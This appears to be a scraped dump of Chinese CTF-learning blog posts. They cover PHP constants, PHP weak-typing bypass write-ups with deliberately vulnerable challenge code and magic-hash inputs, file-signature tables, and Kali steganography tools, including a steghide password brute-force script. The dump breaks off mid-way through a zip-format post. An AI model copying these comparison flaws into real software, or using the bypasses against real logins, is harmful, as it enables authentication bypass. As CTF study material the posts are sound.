define（”常量名称”，常量值）（和C语言的宏常量命名相似） 常量的命名： 1）和变量一样，只能包含字母数字下划线，必须以字母或者下划线开头。 2） 按照惯例常量名字总是大写，根据个人习惯不做强求。 3）自己定义的常量是严格区分大小写的。 defined（）函数来检查是否定义了某个常量。 3、常量和变量的区别。 1）常量的前面没有美元符号（$） 2) 常量只能用define（）函数定义，不能通过赋值语句。 3）常量可以不用理会变量范围的规则而在任何地方定义和使用。（和C语言一样） 4）常量一旦被定义就不能被重新定义或者取消定义。 5）常量的值只能说bool,int,float,string类型。 4、预定义常量： 就是我们php内核已经帮我们定义好了的常量。 怎么感觉就是c,c++里面的库，用的时候前面调用一下就行了。 1）预定义常量是以__开头的，又被称为魔术常量。 2）预定义常量不区分大小写。 代码所在位置不同它的值也是不同的。 八个常用魔术变量： 12345678(1). __FILE__ 当前文件路径(2). __DIR__ 当前文件目录(3). __LINE__ 在文件文件的那一行 (4). __FUNCTION__ 在当前文件的那个函数中 返回 函数名(5). __CLASS__ 在当前文件中的那个类中 返回 类名(6). __METHOD__ 在当前文件的类中的那个方法中 返回 类名::方法名(7). __Trait__ 名包括其被声明的作用区域，从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖(8).__NAMESPACE__ 当前命名空间的名称（区分大小写）。此常量是在编译时定义的.","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP弱类型及绕过方式（二）","slug":"PHP弱类型及绕过方式（二）","date":"2020-05-04T07:04:05.000Z","updated":"2020-05-11T09:00:14.378Z","comments":true,"path":"2020/05/04/PHP弱类型及绕过方式（二）/","link":"","permalink":"https://qidian-png.github.io/2020/05/04/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%88%E4%BA%8C%EF%BC%89/","excerpt":"","text":"继续！！！ 目录： 0×01.md5加密相等绕过 0×02.十六进制与数字比较 0×03.ereg正则%00截断 0×04.strpos数组绕过 0×01.md5加密相等绕过 123456789101112&lt;?php$md51 &#x3D; md5(&#39;QNKCDZO&#39;);$a &#x3D; @$_GET[&#39;a&#39;];$md52 &#x3D; @md5($a);if(isset($a))&#123;if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123;echo &quot;flag&#123;*&#125;&quot;;&#125; else &#123;echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125;?&gt; 看看上面的代码，有点矛盾，让他们MD5加密之后相等，但是明文却不同，what？百度一下，发现QNKCDZO经过MD5 加密之后为： 0e830400451993494058024219903391 原理： PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 那么我们就可以用其他0exxxxx来进行比较就能拿到flag。以下这些字符串，md5哈希之后都是0e开头的： s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 s1502113478a0e861580163291561247404381396064 s1885207154a0e509367213418206700842008763514 s1836677006a0e481036490867661113260034900752 s155964671a0e342768416822451524974117254469 s1184209335a0e072485820392773389523109082030 s1665632922a0e731198061491163073197128363787 s1502113478a0e861580163291561247404381396064 s1836677006a0e481036490867661113260034900752 s1091221200a0e940624217856561557816327384675 s155964671a0e342768416822451524974117254469 0×02.十六进制与数字比较 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;$flag &#x3D; &#39;flag&#123;test&#125;&#39;;$one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值$nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord — 返回字符的 ASCII 码值$number &#x3D; &#39;3735929054&#39;;&#x2F;&#x2F; Check all the input characters!for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123;&#x2F;&#x2F; Disallow all the digits!$digit &#x3D; ord($temp&#123;$i&#125;);if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed!return &quot;flase&quot;;&#125;&#125;if($number &#x3D;&#x3D; $temp)return $flag;&#125;$temp &#x3D; $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt; 首先看看代码，函数要求变量temp不能存在1~9之间的数字，最后，又要求temp=3735929054;有点自相矛盾，但php在转码时会把16进制转化为十进制.于是把3735929054转换成16进制为0xdeadc0de，记得带上0x；把3735929054进行十六进制转化deadc0de，然后PHP再转回来，emmmm就欧克了0×03.ereg正则%00截断 1234567891011121314151617181920212223242526272829303132333435&lt;?php$flag &#x3D; &quot;xxx&quot;;if (isset ($_GET[&#39;password&#39;]))&#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)&#123;echo &#39;You password must be alphanumeric&#39;;&#125;else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)&#123;if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE) &#x2F;&#x2F;strpos — 查找字符串首次出现的位置&#123;die(&#39;Flag: &#39; . $flag);&#125;else&#123;echo(&#39;- have not been found&#39;);&#125;&#125;else&#123;echo &#39;Invalid password&#39;;&#125;&#125;?&gt; 看来一下代码 &lt;8,&gt;9999999,存在矛盾 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。 用正则匹配，如果有’a-zA-Z0-9’则直接错误，我们可以用%00来截断，在%00之后的数值函数无法识别,同时满足 strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999 长度跟数值本来就矛盾，我们可以用1e8 即1x10的八次方或者用数组绕过。 strpos() 查找某字符串在另一字符串中第一次出现的位置（区分大小写），本题中需要匹配到”-“才能输出flag。0×04.strpos数组绕过 1234567891011&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;ctf&#39;])) &#123;if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;必须输入数字才行&#39;;else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39;.$flag);elseecho &#39;骚年，继续努力吧啊~&#39;;&#125;?&gt; 看看代码首先看到的是get传参 ctf，然后必须是数字，然后再绕过 strpos。strpos函数可以用数组绕过。emmmmm，flag到手。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"PHP弱类型及绕过方式（一）","slug":"PHP弱类型及绕过方式（一）","date":"2020-05-03T07:04:05.000Z","updated":"2020-05-27T06:06:35.377Z","comments":true,"path":"2020/05/03/PHP弱类型及绕过方式（一）/","link":"","permalink":"https://qidian-png.github.io/2020/05/03/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"前言：学长带着我们学习了一些PHP弱类型，现在总结记一下。 目录： 0×01.extract函数变量覆盖 0×02.strcmp函数数组漏洞 0×03.urldecode二次密码绕过 0×04.md5函数加密 0×05.sha()函数比较绕过 0×06.数组返回NULL绕过 0×07.弱类型整数大小比较绕过 以下题目来源BugkuCTF 0×01.extract函数变量覆盖 12345678910111213141516&lt;?php$flag&#x3D;&#39;xxx&#39;;extract($_GET);if(isset($shiyan))&#123;$content&#x3D;trim(file_get_contents($flag));if($shiyan&#x3D;&#x3D;$content)&#123;echo&#39;flag&#123;xxx&#125;&#39;;&#125;else&#123;echo&#39;Oh.no&#39;;&#125;&#125;?&gt; 里面有很多函数是我没见过的，先了解一下。 extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。漏洞： isset() 函数用于检测变量是否已设置并且非 NULL。如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是 null 字符（”\\0”）并不等同于 PHP 的 NULL 常量。 trim() 函数移除字符串两侧的空白字符或其他预定义字符。 file_get_contents() 函数把整个文件读入一个字符串中。漏洞：当()里是变量的话，会返回为空值。 运算符的了解：首先，我们传入的函数经过extract函数处理，if语句判断是否存在shiyan变量，file_get_contents() 处理的是flag会返回空值，即content=空值。要想拿到flag，我们就需要让shiyan也为空值，但这并不能看到变量的覆盖。我们传入的shiyan= ,即将原来的shiyan的覆盖为空值，同时我们传入flag= ，覆盖原来flag的值为空，就可以拿到flag了，这题有点小毛病。0×02.strcmp函数数组漏洞 12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123;if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。&#x2F;&#x2F;比较两个字符串（区分大小写）die(&#39;Flag: &#39;.$flag);elseprint &#39;No&#39;;&#125;?&gt; 看到不懂的函数就去问度娘 die() 函数输出一条消息，并退出当前脚本。 int strcmp ( string $str1 , string $str2 )参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。 我们要想拿到flag，就需要str1=str2,但是flag的长度我们也不知道，这个时候我们就不能走寻常路了： 在这里strcmp函数有漏洞只需将get传入进来的变为数组就行了。注：这一个漏洞适用与5.3之前版本的php。flag到手。 0×03.urldecode二次密码绕过 代码奉上： 12345678910111213141516171819202122 &lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;echo(&quot;not allowed!&quot;);exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123;echo &quot;Access granted!&quot;;echo &quot;flag&quot;;&#125;?&gt; eregi()函数在由模式指定的字符串中搜索指定的字符串，搜索不区分大小写。exit() 函数输出一条消息，并退出当前脚本。 我们传入的id会被eregi函数与hackerDJ比较，相同的话直接就GG了。所以我往下面看，我们传入的id经过一次url解码等于hackerDJ的话就可以拿到flag，但是浏览器还会给我们解码一次，这就意味着我们需要给hackerDJ编码两次，就能拿到flag。 0×04.md5函数加密 123456789101112&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123;if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])print &#39;Your password can not be your username.&#39;;else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;]))die(&#39;Flag: &#39;.$flag);elseprint &#39;Invalid password&#39;;&#125;?&gt; 我们要知道md5函数加密在低版本中是无法处理数组的(但是md5处理数组时会返回空值)。那么突破口就来了，但是：两个返回的都是null，自然是相同的，但是代码中又要求我们不相同。emmmmmmm,思考一下。 这样值就不一样了，flag到手！ 0×05.sha()函数比较绕过 123456789101112131415161718192021222324252627282930&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123;var_dump($_GET[&#39;name&#39;]);echo &quot;&quot;;var_dump($_GET[&#39;password&#39;]);var_dump(sha1($_GET[&#39;name&#39;]));var_dump(sha1($_GET[&#39;password&#39;]));if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;])echo &#39;Your password can not be your name!&#39;;else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;]))die(&#39;Flag: &#39;.$flag);elseecho &#39;Invalid password.&#39;;&#125;elseecho &#39;Login first!&#39;;?&gt; 这sha1函数加密，绕过方式和MD5一样，这里就不详讲了。sha1()函数无法处理数组类型，将报错并返回false。flag奉上！ 0×06.数组返回NULL绕过 123456789101112&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;password&#39;])) &#123;if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)echo &#39;You password must be alphanumeric&#39;;else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE)die(&#39;Flag: &#39; . $flag);elseecho &#39;Invalid password&#39;;&#125;?&gt; 1if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE) ereg函数会对你传入的password从a-z,A-Z,0-9 进行匹配，将你的密码限制在这三种字符中。 ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。这里ereg有两个漏洞： ①%00截断及遇到%00则默认为字符串的结束 ②当ntf为数组时它的返回值不是FALSE​这个漏洞没有使用到。 strpos — 查找字符串首次出现的位置作用：主要是用来查找字符在字符串中首次出现的位置。 strpos()如果传入数组，会返回NULL（和MD5，sha1类似无法处理数组，返回值为NULL）思路就出来了： 嘿嘿嘿，flag到手。 0×07.弱类型整数大小比较绕过 1234$temp &#x3D; $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123;echo $flag; 简单明了 is_numeric() 函数用于检测变量是否为数字或数字字符串。我们传入的值会被is_numeric函数进行检测，如果为数字就直接输出no numeric，所以我们要后者使其返回为NULL，并且大于1366. 这就结束了？ 对的 未完待续……","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"CTF杂项题，文件头文件尾格式总结！","slug":"CTF杂项题，文件头文件尾格式总结！","date":"2020-04-10T07:04:05.000Z","updated":"2020-05-11T08:48:37.714Z","comments":true,"path":"2020/04/10/CTF杂项题，文件头文件尾格式总结！/","link":"","permalink":"https://qidian-png.github.io/2020/04/10/CTF%E6%9D%82%E9%A1%B9%E9%A2%98%EF%BC%8C%E6%96%87%E4%BB%B6%E5%A4%B4%E6%96%87%E4%BB%B6%E5%B0%BE%E6%A0%BC%E5%BC%8F%E6%80%BB%E7%BB%93%EF%BC%81/","excerpt":"","text":"zip文件学习 1.文件头文件尾总结JPEG (jpg)， 文件头：FFD8FF 文件尾：FF D9 PNG (png)， 文件头：89504E47 文件尾：AE 42 60 82GIF (gif)， 文件头：47494638 文件尾：00 3B ZIP Archive (zip)， 文件头：504B0304 文件尾：50 4B TIFF (tif)， 文件头：49492A00 文件尾：Windows Bitmap (bmp)， 文件头：424D 文件尾：CAD (dwg)， 文件头：41433130 文件尾：Adobe Photoshop (psd)， 文件头：38425053 文件尾：Rich Text Format (rtf)， 文件头：7B5C727466 文件尾：XML (xml)， 文件头：3C3F786D6C 文件尾：HTML (html)， 文件头：68746D6C3EEmail [thorough only] (eml)， 文件头：44656C69766572792D646174653AOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8FWindows Password (pwl)， 文件头：E3828596 RAR Archive (rar)， 文件头：52617221Wave (wav)， 文件头：57415645AVI (avi)， 文件头：41564920Real Audio (ram)， 文件头：2E7261FDReal Media (rm)， 文件头：2E524D46MPEG (mpg)， 文件头：000001BAMPEG (mpg)， 文件头：000001B3Quicktime (mov)， 文件头：6D6F6F76Windows Media (asf)， 文件头：3026B2758E66CF11MIDI (mid)， 文件头：4D5468642.从winhex中取出的文件头列表 File Type ExtensionsHeader JPEG jpg;jpeg 0xFFD8FF PNG png 0x89504E470D0A1A0A GIF gif GIF8 TIFF tif;tiff 0x49492A00 TIFF tif;tiff 0x4D4D002A Bit map bmp BM AOL ART art 0x4A47040E000000 AOL ART art 0x4A47030E000000 PC Paintbrush pcx 0x0A050108 Graphics Metafile wmf 0xD7CDC69A Graphics Metafile wmf 0x01000900 Graphics Metafile wmf 0x02000900 Enhanced Metafile emf 0x0100000058000000 Corel Draw cdr CDR CAD dwg 0x41433130 Adobe Photoshop psd 8BPS Rich Text Format rtf rtf XML xml HTML html;htm;PHP;php3;php4;phtml;shtml type Email eml Delivery-date: Outlook Express dbx 0xCFAD12FE Outlookpst!BDN MS Office/OLE2doc;xls;dot;ppt;xla;ppa;pps;pot;msi;sdw;db 0xD0CF11E0A1B11AE1 MS Access mdb;mda;mde;mdt Standard J WordPerfect wpd 0xFF575043 OpenOffice Writer sxw writer OpenOffice Calc sxc calc OpenOffice Math sxm math OpenOffice Impress sxi impress OpenOffice Draw sxd draw Adobe FrameMaker fm &lt;MAKERFILE PostScript eps.or.ps;ps;eps %!PS-Adobe Adobe Acrobat pdf %PDF-1. Quicken qdf 0xAC9EBD8F QuickBooks Backup qbb 0x458600000600 Sage sly.or.srt.or.slt;sly;srt;slt0x53520100 Sage Backup 1 SAGEBACKUP Lotus WordPro v9 lwp 0x576F726450726F Lotus 123 v9 123 0x00001A00051004 Lotus 123 v5 wk4 0x00001A0002100400 Lotus 123 v3 wk3 0x00001A0000100400 Lotus 123 v1 wk1 0x2000604060 Windows Password pwl 0xE3828596 ZIP Archive zip;jar 0x504B0304 ZIP Archive (outdated) zip 0x504B3030 RAR Archive rar Rar! GZ Archive gz;tgz 0x1F8B083.各种文件类型文件头标志位详细列表 FFD8FFFE00, .JPEG;.JPE;.JPG, “JPGGraphic File” FFD8FFE000, .JPEG;.JPE;.JPG, “JPGGraphic File” 474946383961, .gif, “GIF 89A” 474946383761, .gif, “GIF 87A” 424D, .bmp, “Windows Bitmap” 4D5A,.exe;.com;.386;.ax;.acm;.sys;.dll;.drv;.flt;.fon;.ocx;.scr;.lrc;.vxd; .cpl;.x32, “Executable File” 504B0304, .zip, “Zip Compressed” 3A42617365, .cnt, “” D0CF11E0A1B11AE1,.doc;.xls;.xlt;.ppt;.apr, “MS Compound Document v1 or Lotus Approach APRfile” 0100000058000000, .emf, “” 03000000C466C456, .evt, “” 3F5F0300, .gid;.hlp;.lhp, “Windows HelpFile” 1F8B08, .gz, “GZ Compressed File” 28546869732066696C65, .hqx, “” 0000010000, .ico, “Icon File” 4C000000011402, .lnk, “Windows LinkFile” 25504446, .pdf, “Adobe PDF File” 5245474544495434, .reg, “” 7B5C727466,.rtf, “Rich Text Format File” lh, .lzh, “Lz compression file” MThd, .mid, “” 0A050108, .pcx, “” 25215053, .eps, “Adobe EPS File” 2112, .ain, “AIN Archive File” 1A02, .arc, “ARC/PKPAK Compressed 1” 1A03, .arc, “ARC/PKPAK Compressed 2” 1A04, .arc, “ARC/PKPAK Compressed 3” 1A08, .arc, “ARC/PKPAK Compressed 4” 1A09, .arc, “ARC/PKPAK Compressed 5” 60EA, .arj, “ARJ Compressed” 41564920, .avi, “Audio Video Interleave(AVI)” 425A68, .bz;.bz2, “Bzip Archive” 49536328, .cab, “Cabinet File” 4C01, .obj, “Compiled Object Module” 303730373037, .tar;.cpio, “CPIO ArchiveFile” 4352555348, .cru;.crush, “CRUSH ArchiveFile” 3ADE68B1, .dcx, “DCX Graphic File” 1F8B, .gz;.tar;.tgz, “Gzip ArchiveFile” 91334846, .hap, “HAP Archive File” 3C68746D6C3E,.htm;.html, “HyperText Markup Language 1” 3C48544D4C3E,.htm;.html, “HyperText Markup Language 2” 3C21444F4354, .htm;.html, “HyperText MarkupLanguage 3” 100, .ico, “ICON File” 5F27A889, .jar, “JAR Archive File” 2D6C68352D,.lha, “LHA Compressed” 20006040600, .wk1;.wks, “Lotus 123 v1 Worksheet” 00001A0007800100, .fm3, “Lotus 123 v3 FMTfile” 00001A0000100400, .wk3, “Lotus 123 v3Worksheet” 20006800200, .fmt, “Lotus 123 v4 FMTfile” 00001A0002100400, .wk4, “Lotus 123 v5” 5B7665725D, .ami, “Lotus Ami Pro” 300000041505052, .adx, “Lotus ApproachADX file” 1A0000030000, .nsf;.ntf, “Lotus NotesDatabase/Template” 4D47582069747064, .ds4, “MicrografixDesigner 4” 4D534346, .cab, “Microsoft CAB FileFormat” 4D546864, .mid, “Midi Audio File” 000001B3, .mpg;.mpeg, “MPEG Movie” 0902060000001000B9045C00, .xls, “MS Excel v2” 0904060000001000F6055C00, .xls, “MS Excel v4” 7FFE340A,.doc, “MS Word” 1234567890FF, .doc, “MS Word 6.0” 31BE000000AB0000, .doc, “MS Word forDOS 6.0” 1A00000300001100, .nsf, “NotesDatabase” 7E424B00, .psp, “PaintShop Pro Image File” 504B0304, .zip, “PKZIP Compressed” 89504E470D0A, .png, “PNG Image File” 6D646174, .mov, “QuickTime Movie” 6D646174, .qt, “Quicktime MovieFile” 52617221, .rar, “RAR Archive File” 2E7261FD, .ra;.ram, “Real AudioFile” EDABEEDB, .rpm, “RPM Archive File” 2E736E64, .au, “SoundMachine AudioFile” 53495421, .sit, “Stuffit v1 ArchiveFile” 53747566664974, .sit, “Stuffit v5Archive File” 1F9D, .z, “TAR Compressed ArchiveFile” 49492A, .tif;.tiff, “TIFF (Intel)” 4D4D2A,.tif;.tiff, “TIFF (Motorola)” 554641, .ufa, “UFA Archive File” 57415645666D74, .wav, “Wave Files” D7CDC69A,.wmf, “Windows Meta File” 4C000000, .lnk, “Windows Shortcut (LinkFile)” 504B3030504B0304, .zip, “WINZIPCompressed” FF575047, .wpg, “WordPerfectGraphics” FF575043, .wp, “WordPerfect v5 orv6” 3C3F786D6C,.xml, “XML Document” FFFE3C0052004F004F0054005300540055004200, .xml, “XML Document(ROOTSTUB)” 3C21454E54495459, .dtd, “XML DTD” 5A4F4F20, .zoo, “ZOO Archive File”第三部分我也是很懵！！！以后总归是要用到的，先留下来吧。大佬的博客","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web","slug":"web","permalink":"https://qidian-png.github.io/tags/web/"}]},{"title":"kail做CTF杂项题的工具安利一波！","slug":"kail做CTF杂项题的工具安利一波！","date":"2020-04-08T07:04:05.000Z","updated":"2020-05-11T08:56:28.238Z","comments":true,"path":"2020/04/08/kail做CTF杂项题的工具安利一波！/","link":"","permalink":"https://qidian-png.github.io/2020/04/08/kail%E5%81%9ACTF%E6%9D%82%E9%A1%B9%E9%A2%98%E7%9A%84%E5%B7%A5%E5%85%B7%E5%AE%89%E5%88%A9%E4%B8%80%E6%B3%A2%EF%BC%81/","excerpt":"","text":"前言：上周的比赛，知识和工具都补充了一波，着实吓到我这老菜鸟了。 1.blind-watermark这个工具主要是解决盲水印问题。克隆到kail里 12345python encode.py --image &lt;image file&gt; --watermark &lt;watermark file&gt; --result &lt;result file&gt;python decode.py --original &lt;original image file&gt; --image &lt;image file&gt; --result &lt;result file&gt;Use --alpha to change the alpha (default 5.0). 这个工具分为加密（encode）和解密（decode）两部分。原始文件，带有水印的文件，解出来的文件（或加密出来的文件）在看不懂我也没办法了。 2.F5隐写F5隐写全称F5-steganography。1.kail安装命令：git clone https://github.com/matthewgao/F5-steganography2.进入F5-steganography文件夹，空白处打开命令终端。3.java Extract 图片的绝对路径/123456.jpg -p 123456切记是绝对路径，并且 -p 后面是密码。4.在文件夹内找到并打开output.txt文件，就会有你想要的答案。 3.outguess隐写kail终端命令输入 git clone https://github.com/crorvick/outguess 进行下载，下载完成后进入outguess文件夹，右击打开终端，执行命令./configure &amp;&amp; make &amp;&amp; make install 进行编译及安装。outguess -k ‘密钥’ -r 图片的绝对路径 flag.txt解密，flag.txt（在outguess文件夹内）中的内容是要隐藏的答案。outguess -k “secret key” -d flag.txt 0.jpg 1.jpg加密，加密之后，0.jpg会覆盖1.jpg。 4.steghide工具如果你的Kali Linux还没有更新过的话，那么执行以下命令进行更新。 apt-get upgrade 当系统更新完毕后，就可以采取在线安装的方式把steghide工具装入到你的系统中。apt-get install steghide 如果权限不够的话需要加，在命令前面加sudo,然后输入自己的密码就🆗了。用法示例：将post.txt文件隐藏到xxx.jpg中：steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）从xxx.jpg解出post.txt:steghide extract -sf xxx.jpg （图片路径）-p 123456（-p 密码）steghide也可以用来爆破密码：需要shell脚本：`#bruteStegHide.sh #bruteStegHide.sh #!/bin/bash for line in `cat $2`;do steghide extract -sf $1 -p $line &gt; /dev/null 2&gt;&amp;1 if [[ $? -eq 0 ]];then echo &apos;password is: &apos;$line exit fi done 用法： # ./bruteStegHide.sh test.jpg passwd.txt 剩下的密码就出来了。 5.文件分离工具（binwalk,foremost）1.binwalk的安装 123git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;binwalkcd binwalkpython setup.py install 运行命令： binwalk -D “archive:zip” -D “image:jpg” hehe.jpg 可以直接分离文件 也可以使用dd命令分离文件，如:dd if=hehe.jpg of=hehe1.zip bs=1 skip=54163 2、Binwalk的提取与分析 2.1、固件扫描 命令：binwalk firmware.bin 通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。 2.2、提取文件 命令：binwalk -e firmware.bin 选项“-e”和“–extract”用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。 命令：binwalk -Me firmware.bin 选项“-M”和“–matryoshka”用于根据magic签名扫描结果进行递归提取，仅对”-e”和“–dd”选项有效。 命令：binwalk -Me -d 5 firmware.bin 选项“-d”和“–depth=“用于限制递归提取深度，默认深度为8，仅当“-M”选项存在时有效。 命令 dd if=（原文件名） of=（提取文件名）skip=数据地址 bs=1 2.3、显示完整的扫描结果 命令：binwalk -I firmware.bin 选项”-I”和“–invalid”用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。 6.foremost的使用。1、foremost在kali linux已经预装。#apt-get install foremost 2、然后看是否下载成功，输入 foremost -h 会显示如下信息（已经翻译） 1234567891011121314$ foremost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;] [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file] -V - 显示版权信息并退出-t - 指定文件类型. (-t jpeg,pdf ...) -d -打开间接块检测 (针对UNIX文件系统) -i - 指定输入文件 (默认为标准输入) -a - 写入所有的文件头部, 不执行错误检测(损坏文件) -w - 向磁盘写入审计文件，不写入任何检测到的文件-o - 设置输出目录 (默认为为输出)-c - 设置配置文件 (默认为 foremost.conf)-q - 启用快速模式. 在512字节边界执行搜索.-Q - 启用安静模式. 禁用输出消息. -v - 详细模式. 向屏幕上记录所有消息。 ctf文件分离的题目，大多时候可以使用binwalk或者winhex也可以使用dd命令。可以使用foremost，相对来说binwalk更加强大，速度也快，但是有时候如果不能分离出来，就可以试试看foremost。 最简单的使用方法就是将图片放进foremost目录下，输入命令： 1foremost -i xxx.jpg 在目录下会出现一个output文件夹，分离出的结果会在里面。 工具就说到这，后面肯定还会有！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"kail","slug":"kail","permalink":"https://qidian-png.github.io/tags/kail/"}]},{"title":"zip知识点的部分总结！","slug":"zip知识点的部分总结！","date":"2020-04-08T07:04:05.000Z","updated":"2020-05-11T09:35:54.816Z","comments":true,"path":"2020/04/08/zip知识点的部分总结！/","link":"","permalink":"https://qidian-png.github.io/2020/04/08/zip%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93%EF%BC%81/","excerpt":"","text":"前言：写这篇博客很犹豫，毕竟是自学可能有很多错误的地方，望大佬指点！目录0×01.zip文件格式及伪加密 0×02.暴力破解 0×03.明文攻击 0×04.CRC爆破 0×01.zip文件格式及伪加密 这就是一个zip文件的格式。 1234567891011121314151617181920212223242526272829303132333435363738394041压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50） 14 00：解压文件所需 pkware 版本 00 00：全局方式位标记（有无加密） 08 00：压缩方式 20 9E：最后修改文件时间 66 4F：最后修改文件日期 F2 1B 0F 4A：CRC-32校验（4A0F1BF2）0E 00 00 00：压缩后尺寸 0C 00 00 00：未压缩尺寸08 00：文件名长度 00 00：扩展记录长度 66 6C 61 67 2E 74 78 74: 文件名（不定长）4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 